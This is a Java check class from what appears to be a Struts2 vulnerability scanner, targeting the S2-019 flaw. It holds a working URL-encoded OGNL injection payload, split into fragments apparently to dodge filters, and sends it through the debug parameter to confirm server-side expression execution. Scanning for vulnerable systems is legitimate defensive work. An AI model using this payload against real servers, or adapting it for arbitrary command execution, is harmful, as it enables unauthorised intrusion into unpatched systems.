package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_019 implements Check {
    public String printInfo(){
        String info = "[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        int number = new Random(10000).nextInt(10000);
        String poc = "%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22" + number +  "%22%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29";

        if (path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }

        String url = protocol + "://" + host + ":" + port + path +"?debug=command&expression=" +poc;

        try {
            HttpResult result = HttpClient.get(url);
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m = p.matcher(result.getData());

            if (m.find()) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m = p.matcher(e.toString());

            if (m.find()) {
                return true;
            } else {
                return false;
            }
        }
    }

}
